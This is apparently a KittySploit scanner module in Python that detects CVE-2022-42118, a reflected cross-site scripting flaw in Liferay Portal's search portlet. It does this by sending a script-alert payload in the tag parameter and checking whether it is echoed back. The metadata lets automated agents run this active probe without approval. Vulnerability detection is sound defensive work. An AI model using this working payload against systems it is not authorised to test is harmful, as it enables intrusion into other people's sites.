#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""A Cross-site scripting (XSS) vulnerability in the Portal Search module in Liferay Portal 7."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Liferay Portal - Cross-site Scripting Detection',
        'description': 'A Cross-site scripting (XSS) vulnerability in the Portal Search module in Liferay Portal 7.1.0 through 7.4.2, and Liferay DXP 7.1 before fix pack 27, 7.2 before fix pack 15, and 7.3 before service pack 3 allows remote attackers to inject arbitrary web script or HTML via the `tag` parameter.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2022', 'liferay', 'xss', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://issues.liferay.com/browse/LPE-17342',
            'https://portal.liferay.dev/learn/security/known-vulnerabilities/-/asset_publisher/HbL5mxmVrnXW/content/cve-2022-42118',
            'https://nvd.nist.gov/vuln/detail/CVE-2022-42118',
        ],
        'cve': 'CVE-2022-42118',
    }

    def run(self):
        r = self.http_request(method="GET", path='/web/guest/home?p_p_id=com_liferay_portal_search_web_portlet_SearchPortlet&p_p_lifecycle=0&_com_liferay_portal_search_web_portlet_SearchPortlet_keywords=test&_com_liferay_portal_search_web_portlet_SearchPortlet_scope=this-site&_com_liferay_portal_search_web_portlet_SearchPortlet_assetTagNames=<script>alert(document.domain)</script>', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        headers = "\n".join(f"{k}: {v}" for k, v in r.headers.items())
        body_any = ('<script>alert(document.domain)</script>',)
        header_all = ('text/html', 'Liferay Portal',)
        if (any(m in body for m in body_any)) and (all(m in headers for m in header_all)):
            self.set_info(
                severity='medium',
                reason="Liferay Portal - Cross-site Scripting detected",
                path='/web/guest/home?p_p_id=com_liferay_portal_search_web_portlet_SearchPortlet&p_p_lifecycle=0&_com_liferay_portal_search_web_portlet_SearchPortlet_keywords=test&_com_liferay_portal_search_web_portlet_SearchPortlet_scope=this-site&_com_liferay_portal_search_web_portlet_SearchPortlet_assetTagNames=<script>alert(document.domain)</script>',
            )
            return True
        return False

